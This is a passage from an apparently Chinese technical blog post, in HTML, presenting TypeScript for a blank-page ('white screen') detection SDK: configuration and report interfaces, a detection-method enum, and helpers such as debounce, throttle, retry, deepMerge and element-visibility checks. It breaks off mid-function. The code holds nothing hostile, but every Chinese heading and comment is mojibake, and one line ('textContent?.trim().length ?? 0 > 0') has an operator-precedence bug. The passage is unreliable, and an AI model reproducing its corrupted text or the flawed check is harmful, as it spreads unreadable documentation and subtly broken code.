<li><strong>éª¨æ¶å±æ£€æµ‹æ³•</strong> - æ£€æµ‹éª¨æ¶å±æ˜¯å¦è¢«æ›¿æ¢ä¸ºå®é™…å†…å®¹</li>
<li><strong>æˆªå›¾å¯¹æ¯”æ³•</strong> - é€šè¿‡ Canvas æˆªå›¾åˆ†æé¡µé¢å†…å®¹</li>
<li><strong>Performance API æ£€æµ‹æ³•</strong> - åˆ©ç”¨æµè§ˆå™¨æ€§èƒ½ API åˆ¤æ–­æ¸²æŸ“çŠ¶æ€</li>
</ol>
<h3 data-id="heading-2">äºŒã€å®Œæ•´çš„ç™½å±æ£€æµ‹ SDK å®ç°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ==================== ç±»å‹å®šä¹‰ ====================</span>

<span class="hljs-comment">/**
 * ç™½å±æ£€æµ‹é…ç½®æ¥å£
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenConfig</span> {
  <span class="hljs-comment">// é‡‡æ ·ç‚¹æ•°é‡ï¼ˆæ°´å¹³å’Œå‚ç›´æ–¹å‘ï¼‰</span>
  samplingPoints?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æ£€æµ‹å»¶è¿Ÿæ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
  delay?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æ£€æµ‹è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
  timeout?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç™½å±é˜ˆå€¼ï¼ˆ0-1ä¹‹é—´ï¼Œè¶…è¿‡è¯¥æ¯”ä¾‹è®¤ä¸ºæ˜¯ç™½å±ï¼‰</span>
  threshold?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æ˜¯å¦å¯ç”¨ DOM æ£€æµ‹</span>
  enableDOMDetection?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ˜¯å¦å¯ç”¨é‡‡æ ·ç‚¹æ£€æµ‹</span>
  enableSamplingDetection?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ˜¯å¦å¯ç”¨ MutationObserver æ£€æµ‹</span>
  enableMutationDetection?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ˜¯å¦å¯ç”¨æˆªå›¾æ£€æµ‹</span>
  enableScreenshotDetection?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ˜¯å¦å¯ç”¨éª¨æ¶å±æ£€æµ‹</span>
  enableSkeletonDetection?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// éª¨æ¶å±å®¹å™¨é€‰æ‹©å™¨</span>
  skeletonSelector?: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// å…³é”®å…ƒç´ é€‰æ‹©å™¨åˆ—è¡¨</span>
  keyElementSelectors?: <span class="hljs-built_in">string</span>[];
  <span class="hljs-comment">// éœ€è¦å¿½ç•¥çš„å…ƒç´ é€‰æ‹©å™¨</span>
  ignoreSelectors?: <span class="hljs-built_in">string</span>[];
  <span class="hljs-comment">// å®¹å™¨å…ƒç´ ï¼ˆé»˜è®¤ä¸º document.bodyï¼‰</span>
  container?: <span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>;
  <span class="hljs-comment">// ä¸ŠæŠ¥å›è°ƒå‡½æ•°</span>
  onReport?: <span class="hljs-function">(<span class="hljs-params">data: WhiteScreenReport</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-comment">// æ£€æµ‹å®Œæˆå›è°ƒ</span>
  onDetectionComplete?: <span class="hljs-function">(<span class="hljs-params">result: DetectionResult</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-comment">// æ˜¯å¦åœ¨å¼€å‘ç¯å¢ƒå¯ç”¨</span>
  enableInDev?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æœ€å¤§é‡è¯•æ¬¡æ•°</span>
  maxRetries?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é‡è¯•é—´éš”ï¼ˆæ¯«ç§’ï¼‰</span>
  retryInterval?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// è‡ªå®šä¹‰ç™½å±åˆ¤æ–­å‡½æ•°</span>
  customDetector?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">boolean</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt;;
}

<span class="hljs-comment">/**
 * ç™½å±æ£€æµ‹æŠ¥å‘Šæ¥å£
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenReport</span> {
  <span class="hljs-comment">// æ˜¯å¦ç™½å±</span>
  <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ£€æµ‹æ—¶é—´æˆ³</span>
  <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é¡µé¢ URL</span>
  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// æ£€æµ‹æ–¹æ³•</span>
  <span class="hljs-attr">detectionMethod</span>: <span class="hljs-title class_">DetectionMethod</span>;
  <span class="hljs-comment">// é‡‡æ ·ç‚¹ç»“æœ</span>
  samplingResult?: <span class="hljs-title class_">SamplingResult</span>;
  <span class="hljs-comment">// DOM æ£€æµ‹ç»“æœ</span>
  domResult?: <span class="hljs-title class_">DOMDetectionResult</span>;
  <span class="hljs-comment">// æˆªå›¾æ£€æµ‹ç»“æœ</span>
  screenshotResult?: <span class="hljs-title class_">ScreenshotResult</span>;
  <span class="hljs-comment">// éª¨æ¶å±æ£€æµ‹ç»“æœ</span>
  skeletonResult?: <span class="hljs-title class_">SkeletonResult</span>;
  <span class="hljs-comment">// é¡µé¢æ€§èƒ½æ•°æ®</span>
  performanceData?: <span class="hljs-title class_">PerformanceData</span>;
  <span class="hljs-comment">// ç”¨æˆ·ä»£ç†ä¿¡æ¯</span>
  <span class="hljs-attr">userAgent</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// è§†å£å°ºå¯¸</span>
  <span class="hljs-attr">viewport</span>: <span class="hljs-title class_">ViewportSize</span>;
  <span class="hljs-comment">// è®¾å¤‡åƒç´ æ¯”</span>
  <span class="hljs-attr">devicePixelRatio</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç½‘ç»œä¿¡æ¯</span>
  networkInfo?: <span class="hljs-title class_">NetworkInfo</span>;
  <span class="hljs-comment">// é”™è¯¯ä¿¡æ¯</span>
  errorInfo?: <span class="hljs-title class_">ErrorInfo</span>;
  <span class="hljs-comment">// è‡ªå®šä¹‰æ•°æ®</span>
  customData?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;;
}

<span class="hljs-comment">/**
 * æ£€æµ‹æ–¹æ³•æšä¸¾
 */</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">DetectionMethod</span> {
  <span class="hljs-variable constant_">SAMPLING</span> = <span class="hljs-string">'sampling'</span>,
  <span class="hljs-variable constant_">DOM</span> = <span class="hljs-string">'dom'</span>,
  <span class="hljs-variable constant_">MUTATION</span> = <span class="hljs-string">'mutation'</span>,
  <span class="hljs-variable constant_">SCREENSHOT</span> = <span class="hljs-string">'screenshot'</span>,
  <span class="hljs-variable constant_">SKELETON</span> = <span class="hljs-string">'skeleton'</span>,
  <span class="hljs-variable constant_">PERFORMANCE</span> = <span class="hljs-string">'performance'</span>,
  <span class="hljs-variable constant_">CUSTOM</span> = <span class="hljs-string">'custom'</span>,
  <span class="hljs-variable constant_">COMBINED</span> = <span class="hljs-string">'combined'</span>
}

<span class="hljs-comment">/**
 * é‡‡æ ·ç‚¹ç»“æœæ¥å£
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">SamplingResult</span> {
  <span class="hljs-comment">// æ€»é‡‡æ ·ç‚¹æ•°</span>
  <span class="hljs-attr">totalPoints</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç©ºç™½ç‚¹æ•°</span>
  <span class="hljs-attr">emptyPoints</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç©ºç™½æ¯”ä¾‹</span>
  <span class="hljs-attr">emptyRatio</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é‡‡æ ·ç‚¹è¯¦æƒ…</span>
  <span class="hljs-attr">pointDetails</span>: <span class="hljs-title class_">SamplingPointDetail</span>[];
}

<span class="hljs-comment">/**
 * é‡‡æ ·ç‚¹è¯¦æƒ…
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">SamplingPointDetail</span> {
  <span class="hljs-comment">// X åæ ‡</span>
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// Y åæ ‡</span>
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// å…ƒç´ æ ‡ç­¾å</span>
  <span class="hljs-attr">tagName</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>;
  <span class="hljs-comment">// æ˜¯å¦ä¸ºç©ºç™½ç‚¹</span>
  <span class="hljs-attr">isEmpty</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// å…ƒç´ ç±»å</span>
  className?: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// å…ƒç´  ID</span>
  id?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">/**
 * DOM æ£€æµ‹ç»“æœæ¥å£
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DOMDetectionResult</span> {
  <span class="hljs-comment">// æ˜¯å¦é€šè¿‡æ£€æµ‹</span>
  <span class="hljs-attr">passed</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ£€æµ‹åˆ°çš„å…³é”®å…ƒç´ æ•°é‡</span>
  <span class="hljs-attr">foundElements</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æœŸæœ›çš„å…³é”®å…ƒç´ æ•°é‡</span>
  <span class="hljs-attr">expectedElements</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç¼ºå¤±çš„å…ƒç´ é€‰æ‹©å™¨</span>
  <span class="hljs-attr">missingSelectors</span>: <span class="hljs-built_in">string</span>[];
  <span class="hljs-comment">// å…ƒç´ è¯¦æƒ…</span>
  <span class="hljs-attr">elementDetails</span>: <span class="hljs-title class_">ElementDetail</span>[];
}

<span class="hljs-comment">/**
 * å…ƒç´ è¯¦æƒ…
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ElementDetail</span> {
  <span class="hljs-comment">// é€‰æ‹©å™¨</span>
  <span class="hljs-attr">selector</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// æ˜¯å¦å­˜åœ¨</span>
  <span class="hljs-attr">exists</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ˜¯å¦å¯è§</span>
  isVisible?: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// å…ƒç´ å°ºå¯¸</span>
  dimensions?: {
    <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>;
  };
}

<span class="hljs-comment">/**
 * æˆªå›¾æ£€æµ‹ç»“æœ
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ScreenshotResult</span> {
  <span class="hljs-comment">// æ˜¯å¦ç™½å±</span>
  <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// ç™½è‰²åƒç´ æ¯”ä¾‹</span>
  <span class="hljs-attr">whitePixelRatio</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æ€»åƒç´ æ•°</span>
  <span class="hljs-attr">totalPixels</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç™½è‰²åƒç´ æ•°</span>
  <span class="hljs-attr">whitePixels</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é¢œè‰²åˆ†å¸ƒ</span>
  colorDistribution?: <span class="hljs-title class_">ColorDistribution</span>;
}

<span class="hljs-comment">/**
 * é¢œè‰²åˆ†å¸ƒ
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ColorDistribution</span> {
  <span class="hljs-attr">white</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">black</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">gray</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">colored</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">/**
 * éª¨æ¶å±æ£€æµ‹ç»“æœ
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">SkeletonResult</span> {
  <span class="hljs-comment">// éª¨æ¶å±æ˜¯å¦å­˜åœ¨</span>
  <span class="hljs-attr">skeletonExists</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// éª¨æ¶å±æ˜¯å¦å·²ç§»é™¤</span>
  <span class="hljs-attr">skeletonRemoved</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// æ£€æµ‹æ—¶é—´</span>
  <span class="hljs-attr">detectionTime</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">/**
 * æ€§èƒ½æ•°æ®
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">PerformanceData</span> {
  <span class="hljs-comment">// DOM åŠ è½½å®Œæˆæ—¶é—´</span>
  domContentLoaded?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é¡µé¢å®Œå…¨åŠ è½½æ—¶é—´</span>
  loadComplete?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é¦–æ¬¡å†…å®¹ç»˜åˆ¶æ—¶é—´</span>
  firstContentfulPaint?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æœ€å¤§å†…å®¹ç»˜åˆ¶æ—¶é—´</span>
  largestContentfulPaint?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// é¦–æ¬¡è¾“å…¥å»¶è¿Ÿ</span>
  firstInputDelay?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// ç´¯è®¡å¸ƒå±€åç§»</span>
  cumulativeLayoutShift?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// å¯äº¤äº’æ—¶é—´</span>
  timeToInteractive?: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">/**
 * è§†å£å°ºå¯¸
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ViewportSize</span> {
  <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">/**
 * ç½‘ç»œä¿¡æ¯
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">NetworkInfo</span> {
  <span class="hljs-comment">// ç½‘ç»œç±»å‹</span>
  effectiveType?: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// ä¸‹è¡Œå¸¦å®½</span>
  downlink?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// RTT</span>
  rtt?: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æ˜¯å¦åœ¨çº¿</span>
  <span class="hljs-attr">online</span>: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-comment">/**
 * é”™è¯¯ä¿¡æ¯
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ErrorInfo</span> {
  <span class="hljs-comment">// é”™è¯¯æ¶ˆæ¯</span>
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// é”™è¯¯å †æ ˆ</span>
  stack?: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// é”™è¯¯ç±»å‹</span>
  <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">/**
 * æ£€æµ‹ç»“æœ
 */</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DetectionResult</span> {
  <span class="hljs-comment">// æ˜¯å¦ç™½å±</span>
  <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-comment">// ç½®ä¿¡åº¦ï¼ˆ0-1ï¼‰</span>
  <span class="hljs-attr">confidence</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// æ£€æµ‹æ–¹æ³•</span>
  <span class="hljs-attr">methods</span>: <span class="hljs-title class_">DetectionMethod</span>[];
  <span class="hljs-comment">// å„æ–¹æ³•ç»“æœ</span>
  <span class="hljs-attr">methodResults</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">DetectionMethod</span>, <span class="hljs-built_in">boolean</span>&gt;;
  <span class="hljs-comment">// æœ€ç»ˆåˆ¤å®šä¾æ®</span>
  <span class="hljs-attr">basis</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ==================== å·¥å…·å‡½æ•° ====================</span>

<span class="hljs-comment">/**
 * é˜²æŠ–å‡½æ•°
 */</span>
<span class="hljs-keyword">function</span> debounce&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">unknown</span>[]) =&gt; <span class="hljs-built_in">unknown</span>&gt;(
  <span class="hljs-attr">func</span>: T,
  <span class="hljs-attr">wait</span>: <span class="hljs-built_in">number</span>
): <span class="hljs-function">(<span class="hljs-params">...args: Parameters&lt;T&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">timeoutId</span>: <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">this</span>: <span class="hljs-built_in">unknown</span>, ...args: Parameters&lt;T&gt;</span>) {
    <span class="hljs-keyword">if</span> (timeoutId !== <span class="hljs-literal">null</span>) {
      <span class="hljs-built_in">clearTimeout</span>(timeoutId);
    }
    
    timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
      timeoutId = <span class="hljs-literal">null</span>;
    }, wait);
  };
}

<span class="hljs-comment">/**
 * èŠ‚æµå‡½æ•°
 */</span>
<span class="hljs-keyword">function</span> throttle&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">unknown</span>[]) =&gt; <span class="hljs-built_in">unknown</span>&gt;(
  <span class="hljs-attr">func</span>: T,
  <span class="hljs-attr">limit</span>: <span class="hljs-built_in">number</span>
): <span class="hljs-function">(<span class="hljs-params">...args: Parameters&lt;T&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">let</span> inThrottle = <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">this</span>: <span class="hljs-built_in">unknown</span>, ...args: Parameters&lt;T&gt;</span>) {
    <span class="hljs-keyword">if</span> (!inThrottle) {
      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
      inThrottle = <span class="hljs-literal">true</span>;
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        inThrottle = <span class="hljs-literal">false</span>;
      }, limit);
    }
  };
}

<span class="hljs-comment">/**
 * å»¶è¿Ÿæ‰§è¡Œ
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params">ms: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));
}

<span class="hljs-comment">/**
 * å¸¦è¶…æ—¶çš„ Promise
 */</span>
<span class="hljs-keyword">function</span> withTimeout&lt;T&gt;(
  <span class="hljs-attr">promise</span>: <span class="hljs-title class_">Promise</span>&lt;T&gt;,
  <span class="hljs-attr">ms</span>: <span class="hljs-built_in">number</span>,
  errorMessage = <span class="hljs-string">'Operation timed out'</span>
): <span class="hljs-title class_">Promise</span>&lt;T&gt; {
  <span class="hljs-keyword">const</span> timeout = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">never</span>&gt;(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(errorMessage)), ms);
  });
  
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([promise, timeout]);
}

<span class="hljs-comment">/**
 * é‡è¯•å‡½æ•°
 */</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> retry&lt;T&gt;(
  <span class="hljs-attr">fn</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;,
  <span class="hljs-attr">maxRetries</span>: <span class="hljs-built_in">number</span>,
  <span class="hljs-attr">retryInterval</span>: <span class="hljs-built_in">number</span>
): <span class="hljs-title class_">Promise</span>&lt;T&gt; {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">lastError</span>: <span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; maxRetries; i++) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn</span>();
    } <span class="hljs-keyword">catch</span> (error) {
      lastError = error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>;
      <span class="hljs-keyword">if</span> (i &lt; maxRetries - <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(retryInterval);
      }
    }
  }
  
  <span class="hljs-keyword">throw</span> lastError;
}

<span class="hljs-comment">/**
 * ç”Ÿæˆå”¯ä¸€ ID
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">generateUniqueId</span>(<span class="hljs-params"/>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>-<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).substr(<span class="hljs-number">2</span>, <span class="hljs-number">9</span>)}</span>`</span>;
}

<span class="hljs-comment">/**
 * æ·±åº¦åˆå¹¶å¯¹è±¡
 */</span>
<span class="hljs-keyword">function</span> deepMerge&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(
  <span class="hljs-attr">target</span>: T,
  <span class="hljs-attr">source</span>: <span class="hljs-title class_">Partial</span>&lt;T&gt;
): T {
  <span class="hljs-keyword">const</span> result = { ...target };
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> source) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hasOwnProperty</span>.<span class="hljs-title function_">call</span>(source, key)) {
      <span class="hljs-keyword">const</span> sourceValue = source[key];
      <span class="hljs-keyword">const</span> targetValue = result[key];
      
      <span class="hljs-keyword">if</span> (
        <span class="hljs-keyword">typeof</span> sourceValue === <span class="hljs-string">'object'</span> &amp;&amp;
        sourceValue !== <span class="hljs-literal">null</span> &amp;&amp;
        !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(sourceValue) &amp;&amp;
        <span class="hljs-keyword">typeof</span> targetValue === <span class="hljs-string">'object'</span> &amp;&amp;
        targetValue !== <span class="hljs-literal">null</span> &amp;&amp;
        !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(targetValue)
      ) {
        result[key] = <span class="hljs-title function_">deepMerge</span>(
          targetValue <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;,
          sourceValue <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;
        ) <span class="hljs-keyword">as</span> T[<span class="hljs-title class_">Extract</span>&lt;keyof T, <span class="hljs-built_in">string</span>&gt;];
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sourceValue !== <span class="hljs-literal">undefined</span>) {
        result[key] = sourceValue <span class="hljs-keyword">as</span> T[<span class="hljs-title class_">Extract</span>&lt;keyof T, <span class="hljs-built_in">string</span>&gt;];
      }
    }
  }
  
  <span class="hljs-keyword">return</span> result;
}

<span class="hljs-comment">/**
 * æ£€æŸ¥å…ƒç´ æ˜¯å¦å¯è§
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isElementVisible</span>(<span class="hljs-params">element: Element</span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">if</span> (!element) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">const</span> style = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getComputedStyle</span>(element);
  
  <span class="hljs-keyword">if</span> (style.<span class="hljs-property">display</span> === <span class="hljs-string">'none'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (style.<span class="hljs-property">visibility</span> === <span class="hljs-string">'hidden'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (style.<span class="hljs-property">opacity</span> === <span class="hljs-string">'0'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">width</span> === <span class="hljs-number">0</span> || rect.<span class="hljs-property">height</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">/**
 * è·å–å…ƒç´ åœ¨æŒ‡å®šåæ ‡å¤„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getElementAtPoint</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span>, y: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">Element</span> | <span class="hljs-literal">null</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">elementFromPoint</span>(x, y);
  } <span class="hljs-keyword">catch</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }
}

<span class="hljs-comment">/**
 * åˆ¤æ–­æ˜¯å¦ä¸ºåŒ…è£…å…ƒç´ ï¼ˆé€šå¸¸ç”¨äºå¸ƒå±€çš„ç©ºå…ƒç´ ï¼‰
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isWrapperElement</span>(<span class="hljs-params">element: Element | <span class="hljs-literal">null</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">if</span> (!element) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  
  <span class="hljs-keyword">const</span> wrapperTags = [
    <span class="hljs-string">'HTML'</span>, <span class="hljs-string">'BODY'</span>, <span class="hljs-string">'DIV'</span>, <span class="hljs-string">'SECTION'</span>, <span class="hljs-string">'ARTICLE'</span>, <span class="hljs-string">'MAIN'</span>,
    <span class="hljs-string">'HEADER'</span>, <span class="hljs-string">'FOOTER'</span>, <span class="hljs-string">'NAV'</span>, <span class="hljs-string">'ASIDE'</span>, <span class="hljs-string">'SPAN'</span>
  ];
  
  <span class="hljs-keyword">const</span> tagName = element.<span class="hljs-property">tagName</span>.<span class="hljs-title function_">toUpperCase</span>();
  
  <span class="hljs-keyword">if</span> (!wrapperTags.<span class="hljs-title function_">includes</span>(tagName)) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å®é™…å†…å®¹</span>
  <span class="hljs-keyword">const</span> hasText = element.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>().<span class="hljs-property">length</span> ?? <span class="hljs-number">0</span> &gt; <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> hasChildren = element.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> hasBackground = <span class="hljs-title function_">hasBackgroundContent</span>(element);
  
